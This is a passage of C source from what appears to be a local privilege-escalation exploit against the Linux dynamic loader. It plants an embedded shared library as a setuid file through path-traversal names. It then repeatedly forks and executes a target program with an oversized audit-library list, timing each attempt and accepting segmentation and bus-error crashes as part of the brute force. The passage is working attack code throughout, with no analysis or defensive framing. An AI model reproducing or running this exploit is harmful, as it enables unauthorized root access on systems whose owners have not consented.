        ABS_LA_DIR "/." REL_LA,
        ABS_LA_DIR "/.." REL_LA,
    };
    size_t i;
    for (i = 0; i < sizeof(abs_las)/sizeof(*abs_las); i++) {
        const int fd = open(abs_las[i], O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW, 0);
        if (fd <= -1) die();
      {
        struct stat st;
        if (fstat(fd, &st)) die();
        if (!S_ISREG(st.st_mode)) die();
        if (st.st_uid != getuid()) die();
        if (st.st_uid != geteuid()) die();
      }
      {
        static const
        #include "la.so.h"
        if (sizeof(la_so) != la_so_len) die();
        if (write(fd, la_so, sizeof(la_so)) != (ssize_t)sizeof(la_so)) die();
      }
        if (fchmod(fd, 04755)) die();
        if (close(fd)) die();
    }
  }

    size_t try;
    for (try = 1; try <= 65536; try++) {
      {
        char * cp = mempcpy(rlda, LDA, sizeof(LDA)-1);
        size_t rldas = 1 + random() % (65536 / sizeof(struct audit_list));
        if (rldas > MAX_RLDAS) die();
        if (rldas <= 0) die();
        while (rldas--) {
            cp = mempcpy(cp, REL_LA ":", sizeof(REL_LA));
        }
        if (cp >= rlda + sizeof(rlda)) die();
        *cp = '\0';
      }
        if (fflush(stdout)) die();
        const pid_t pid = fork();
        if (pid <= -1) die();
        if (pid == 0) {
            if (dup2(pipefd[1], 1) != 1) die();
            if (dup2(pipefd[1], 2) != 2) die();
            execve(*argv, argv, envp);
            die();
        }
        int status = 0;
        struct timeval start, stop, diff;
        if (gettimeofday(&start, NULL)) die();
        if (waitpid(pid, &status, WUNTRACED) != pid) die();
        if (gettimeofday(&stop, NULL)) die();
        timersub(&stop, &start, &diff);
        printf("try %zu %ld.%06ld ", try, diff.tv_sec, diff.tv_usec);

        if (WIFSIGNALED(status)) {
            printf("signal %d\n", WTERMSIG(status));
            switch (WTERMSIG(status)) {
                case SIGPIPE:
                case SIGSEGV:
                case SIGBUS:
                    break;
                default:
                    die();
            }
        } else if (WIFEXITED(status)) {
            printf("exited %d\n", WEXITSTATUS(status));
            die();
        } else if (WIFSTOPPED(status)) {
            printf("stopped %d\n", WSTOPSIG(status));
            die();
        } else {
            printf("unknown %d\n", status);
            die();
        }
    }
    die();
}